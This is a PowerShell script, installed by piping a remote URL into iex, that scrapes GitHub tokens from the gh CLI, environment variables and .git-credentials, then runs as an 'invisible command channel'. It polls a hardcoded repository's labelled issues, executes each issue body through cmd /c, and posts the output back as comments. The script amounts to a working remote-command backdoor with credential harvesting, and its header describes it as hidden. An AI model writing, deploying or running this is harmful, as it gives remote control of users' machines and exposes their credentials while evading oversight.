<#
dao agent — transparent transport pipe receiver
GitHub Issues = invisible command channel
Usage: irm https://raw.githubusercontent.com/{user}/devin-remote/main/agent.ps1 | iex
#>
param([string]$Repo = "zhouyoukang1234-spec/devin-remote", [string]$Token = "")
$LABEL = "devin-cmd"
$CID = "178c6fc778ccc68e1d6a"  # GitHub CLI OAuth App (public, Device Flow)

# ── Auto auth chain (zero user input) ──
if (-not $Token) {
  # 1. gh CLI (fastest, zero input)
  try { $t = & gh auth token 2>$null; if ($t -and $t -notmatch 'error') { $Token = $t.Trim() } } catch {}
  # 2. Env vars
  if (-not $Token) { $Token = $env:DAO_TOKEN; if (-not $Token) { $Token = $env:GITHUB_TOKEN } }
  # 3. .git-credentials
  if (-not $Token -and (Test-Path "$env:USERPROFILE\.git-credentials")) {
    $gc = Get-Content "$env:USERPROFILE\.git-credentials" -EA 0 | ? { $_ -match 'github\.com' } | Select-Object -First 1
    if ($gc -match ':([^:@]+)@github') { $Token = $Matches[1] }
  }
  # 4. git credential fill
  if (-not $Token) {
    try { $cf = "protocol=https`nhost=github.com`n`n" | git credential fill 2>$null
          if ($cf -match "password=(.+)") { $Token = $Matches[1] } } catch {}
  }
  # 5. Device Flow (one-time, auto-save to .git-credentials)
  if (-not $Token) {
    try {
      $df = Invoke-RestMethod "https://github.com/login/device/code" -Method Post `
        -Body ('{"client_id":"' + $CID + '","scope":"repo"}') -ContentType "application/json" -EA Stop
      Write-Host "`n  Open: $($df.verification_uri)" -F White -B DarkBlue
      Write-Host "  Code: $($df.user_code)`n" -F Yellow
      $end = (Get-Date).AddSeconds($df.expires_in)
      while ((Get-Date) -lt $end) {
        Start-Sleep $df.interval
        try {
          $p = Invoke-RestMethod "https://github.com/login/oauth/access_token" -Method Post `
            -Body ('{"client_id":"' + $CID + '","device_code":"' + $df.device_code + '"}') -ContentType "application/json" -EA Stop
          if ($p.access_token) { $Token = $p.access_token; break }
        } catch {}
      }
      if ($Token) {
        $me = Invoke-RestMethod "https://api.github.com/user" -H @{"Authorization"="Bearer $Token";Accept="application/vnd.github+json"}
        $cf = "$env:USERPROFILE\.git-credentials"
        $lines = if (Test-Path $cf) { Get-Content $cf -EA 0 | ? { $_ -notmatch 'github' } } else { @() }
        $lines += "https://$($me.login):${Token}@github.com"
        Set-Content $cf $lines -Force
        Write-Host "[dao] $($me.login) authenticated" -F Green
      }
    } catch { Write-Host "[dao] Device Flow failed: $_" -F Red }
  }
}
if (-not $Token) { Write-Host "[dao] no token — set DAO_TOKEN env or run: gh auth login" -F Red; exit 1 }

$H = @{ "Authorization" = "Bearer $Token"; "Accept" = "application/vnd.github+json"; "X-GitHub-Api-Version" = "2022-11-28"; "Content-Type" = "application/json"; "User-Agent" = "dao/1" }
$API = "https://api.github.com/repos/$Repo"

# Verify
try { $me = Invoke-RestMethod "https://api.github.com/user" -H $H -EA Stop; Write-Host "[dao] $($me.login) @ $Repo" -F Green }
catch { Write-Host "[dao] auth failed" -F Red; exit 1 }

# Ensure label
try { Invoke-RestMethod "$API/labels/$LABEL" -H $H -EA Stop | Out-Null }
catch { try { Invoke-RestMethod "$API/labels" -H $H -Method Post -Body (@{name=$LABEL;color="0075ca"}|ConvertTo-Json) -EA Stop | Out-Null } catch {} }

# Transport loop
Write-Host "[dao] pipe active (Ctrl+C stop)" -F Cyan
$seen = @{}
while ($true) {
  try {
    $issues = Invoke-RestMethod "$API/issues?labels=$LABEL&state=open&per_page=10" -H $H -EA Stop
    foreach ($i in $issues) {
      if ($seen[$i.number]) { continue }
      $seen[$i.number] = 1
      $cmd = $i.body; if (-not $cmd) { continue }
      Write-Host "[dao] > $cmd" -F Yellow
      $sw = [Diagnostics.Stopwatch]::StartNew()
      try { $out = cmd /c $cmd 2>&1 | Out-String; $ok = $true } catch { $out = $_.Exception.Message; $ok = $false }
      $sw.Stop()
      if ($out.Length -gt 60000) { $out = $out.Substring(0,60000) + "`n[truncated]" }
      $res = "**Result** ($($sw.ElapsedMilliseconds)ms) ``$ok```n`````n$out``````n"
      try { Invoke-RestMethod "$API/issues/$($i.number)/comments" -H $H -Method Post -Body (@{body=$res}|ConvertTo-Json) -EA Stop | Out-Null } catch {}
      try { Invoke-RestMethod "$API/issues/$($i.number)" -H $H -Method Patch -Body (@{state="closed"}|ConvertTo-Json) -EA Stop | Out-Null } catch {}
      Write-Host "[dao] < done ($($sw.ElapsedMilliseconds)ms)" -F Green
    }
  } catch {}
  Start-Sleep 5
}
